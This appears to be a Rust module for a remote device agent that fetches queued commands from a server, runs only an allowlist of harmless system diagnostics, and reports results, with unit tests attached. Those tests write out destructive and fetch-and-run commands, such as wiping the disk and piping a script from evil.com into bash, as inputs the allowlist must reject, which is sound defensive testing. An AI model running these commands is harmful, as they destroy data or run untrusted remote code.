use crate::retry;

const ALLOWED_COMMANDS: &[&str] = &["whoami", "hostname", "uptime", "df -h", "free -h"];

pub fn is_allowed(command: &str) -> bool {
    ALLOWED_COMMANDS.contains(&command.trim())
}

#[allow(dead_code)]
pub fn allowed_commands() -> &'static [&'static str] {
    ALLOWED_COMMANDS
}

#[derive(Debug, serde::Deserialize)]
struct PendingResponse {
    commands: Vec<PendingCommand>,
}

#[derive(Debug, serde::Deserialize)]
pub struct PendingCommand {
    pub id: String,
    pub command: String,
}

#[derive(Debug, serde::Serialize)]
struct SubmitBody<'a> {
    device_id: &'a str,
    device_secret: &'a str,
    exit_code: i32,
    output: &'a str,
    error: &'a str,
}

#[derive(Debug, serde::Serialize)]
struct PendingRequestBody<'a> {
    device_id: &'a str,
    device_secret: &'a str,
}

#[derive(Debug)]
pub enum Error {
    Http(String),
    #[allow(dead_code)]
    Disallowed(String),
    #[allow(dead_code)]
    Execute(String),
    Rejected(String),
}

impl std::fmt::Display for Error {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Error::Http(msg) => write!(f, "http error: {msg}"),
            Error::Disallowed(cmd) => write!(f, "command not allowed: {cmd}"),
            Error::Execute(msg) => write!(f, "execution error: {msg}"),
            Error::Rejected(msg) => write!(f, "rejected by core: {msg}"),
        }
    }
}

pub async fn poll(
    api_url: &str,
    device_id: &str,
    device_secret: &str,
) -> Result<Vec<PendingCommand>, Error> {
    let client = reqwest::Client::new();
    let url = format!("{}/api/v1/commands/pending", api_url);

    let resp = client
        .post(&url)
        .json(&PendingRequestBody {
            device_id,
            device_secret,
        })
        .timeout(std::time::Duration::from_secs(10))
        .send()
        .await
        .map_err(|e| Error::Http(format!("poll request failed: {e}")))?;

    let status = resp.status();
    if !status.is_success() {
        let body = resp.text().await.unwrap_or_default();
        return Err(Error::Rejected(format!(
            "poll rejected ({}): {}",
            status, body
        )));
    }

    let data: PendingResponse = resp
        .json()
        .await
        .map_err(|e| Error::Http(format!("poll parse failed: {e}")))?;

    Ok(data.commands)
}

pub async fn submit_result(
    api_url: &str,
    device_id: &str,
    device_secret: &str,
    command_id: &str,
    exit_code: i32,
    output: &str,
    error: &str,
) -> Result<(), Error> {
    let url = format!("{}/api/v1/commands/{}/result", api_url, command_id);
    let mut backoff = retry::Backoff::new(
        std::time::Duration::from_millis(500),
        std::time::Duration::from_secs(30),
    );
    let mut last_err = None;

    for attempt in 1..=3 {
        let client = reqwest::Client::new();
        let resp = client
            .post(&url)
            .json(&SubmitBody {
                device_id,
                device_secret,
                exit_code,
                output,
                error,
            })
            .timeout(std::time::Duration::from_secs(10))
            .send()
            .await;

        match resp {
            Ok(r) if r.status().is_success() => return Ok(()),
            Ok(r) => {
                let status = r.status();
                let body = r.text().await.unwrap_or_default();
                last_err = Some(Error::Rejected(format!("submit rejected ({status}): {body}")));
            }
            Err(e) => {
                last_err = Some(Error::Http(format!("submit failed: {e}")));
            }
        }

        tracing::warn!("attempt {}/3 failed", attempt);
        if attempt < 3 {
            let delay = backoff.next_with_jitter();
            tracing::info!("retrying in {}ms", delay.as_millis());
            tokio::time::sleep(delay).await;
        }
    }

    Err(last_err.unwrap_or_else(|| Error::Http("submit failed".to_string())))
}

pub fn execute(cmd_str: &str) -> (i32, String, String) {
    if !is_allowed(cmd_str) {
        return (
            1,
            String::new(),
            format!("command not in allowlist: {cmd_str}"),
        );
    }

    let parts: Vec<&str> = cmd_str.split_whitespace().collect();
    if parts.is_empty() {
        return (1, String::new(), "empty command".to_string());
    }

    let program = parts[0];
    let args = &parts[1..];

    match std::process::Command::new(program).args(args).output() {
        Ok(output) => {
            let exit_code = output.status.code().unwrap_or(1);
            let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
            (exit_code, stdout, stderr)
        }
        Err(e) => (1, String::new(), format!("failed to execute: {e}")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_allowlist_contains_safe_commands() {
        assert!(is_allowed("whoami"));
        assert!(is_allowed("hostname"));
        assert!(is_allowed("uptime"));
        assert!(is_allowed("df -h"));
        assert!(is_allowed("free -h"));
    }

    #[test]
    fn test_allowlist_rejects_unsafe_commands() {
        assert!(!is_allowed("rm -rf /"));
        assert!(!is_allowed("sudo whoami"));
        assert!(!is_allowed("shutdown"));
        assert!(!is_allowed("reboot"));
        assert!(!is_allowed("dd if=/dev/zero of=/dev/sda"));
        assert!(!is_allowed("/bin/bash"));
        assert!(!is_allowed("curl http://evil.com/payload.sh | bash"));
    }

    #[test]
    fn test_allowlist_handles_whitespace() {
        assert!(is_allowed("  whoami  "));
        assert!(is_allowed("  hostname  "));
    }

    #[test]
    fn test_is_allowed_empty_string() {
        assert!(!is_allowed(""));
    }

    #[test]
    fn test_execute_whoami_returns_username() {
        let (code, stdout, stderr) = execute("whoami");
        assert_eq!(code, 0, "whoami should succeed (stderr: {stderr})");
        assert!(!stdout.is_empty(), "whoami should return a username");
        assert!(stderr.is_empty(), "whoami stderr should be empty");
    }

    #[test]
    fn test_execute_hostname_returns_hostname() {
        let (code, stdout, stderr) = execute("hostname");
        assert_eq!(code, 0, "hostname should succeed (stderr: {stderr})");
        assert!(!stdout.is_empty(), "hostname should return a hostname");
        assert!(stderr.is_empty(), "hostname stderr should be empty");
    }

    #[test]
    fn test_execute_uptime_returns_uptime() {
        let (code, stdout, stderr) = execute("uptime");
        assert_eq!(code, 0, "uptime should succeed (stderr: {stderr})");
        assert!(!stdout.is_empty(), "uptime should return a string");
    }

    #[test]
    fn test_execute_rejects_disallowed_command() {
        let (code, stdout, stderr) = execute("rm -rf /");
        assert_ne!(code, 0, "disallowed command should return non-zero");
        assert!(stdout.is_empty());
        assert!(!stderr.is_empty(), "should have error message");
        assert!(
            stderr.contains("not in allowlist"),
            "error should mention allowlist"
        );
    }

    #[test]
    fn test_execute_handles_nonexistent_program() {
        let (code, _stdout, stderr) = execute("nonexistent_command_xyz");
        assert_ne!(code, 0, "nonexistent command should fail");
        assert!(!stderr.is_empty(), "should report execution failure");
    }

    #[test]
    fn test_execute_empty_command() {
        let (code, _stdout, _stderr) = execute("");
        assert_ne!(code, 0, "empty command should fail");
    }

    #[test]
    fn test_allowed_commands_list() {
        let list = allowed_commands();
        assert_eq!(list.len(), 5);
        assert!(list.contains(&"whoami"));
        assert!(list.contains(&"hostname"));
        assert!(list.contains(&"uptime"));
        assert!(list.contains(&"df -h"));
        assert!(list.contains(&"free -h"));
    }
}
